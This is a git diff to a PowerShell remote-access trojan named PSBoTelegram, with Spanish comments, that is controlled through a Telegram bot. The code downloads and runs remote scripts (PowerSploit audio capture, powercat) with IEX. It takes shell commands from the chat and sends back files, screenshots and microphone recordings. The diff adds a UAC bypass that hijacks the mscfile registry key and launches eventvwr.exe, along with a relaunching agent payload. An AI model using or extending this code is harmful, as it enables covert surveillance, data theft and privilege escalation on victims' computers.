@@ -1,9 +1,14 @@
+########################################################## Agent Bot Code ##########################################################
+
+$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ;$bot = [string]$bot[3];$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" 
 
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
 $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
 #IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
+
+############################################################# Funciones propias #############################################################
 
 function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
 
@@ -128,6 +133,7 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
+
 function graba-audio { param ($botkey,$chat_id,$segundos)
 $ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
 $audio = $ruta + "\" + "audio.wav"
@@ -138,14 +144,33 @@ bot-send -file $audio -botkey $botkey -chat_id $chat_id
 
 }
 
+function BypassUAC-CyberVaca {param ([string]$comando)
+$ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
+New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
+$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
+Start-Process eventvwr.exe ; sleep -Seconds 3
+Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; Remove-Item $ruta }
+
+
+function whoami_me {
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{$privilegios = "No tienes privilegios administrativos" }  else {$privilegios = "Tienes todos los privilegios"}
+$usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
+$result = New-Object psobject -Property @{
+"Usuario" = $usuario
+"Dominio" = $dominio
+"Privilegios" = $privilegios
+ }
+ $result | Select-Object usuario, dominio, privilegios | FL
+}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio"
+ $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio[*] /BypassUAC"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$texto = whoami_me; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; exit}
  if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -153,6 +178,6 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
  if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
- #if ($kill -eq "$true" -and $first_connect -gt 5) {break;exit}
+ if ($comando -like "/BypassUAC") {BypassUAC-CyberVaca; $texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 
 }
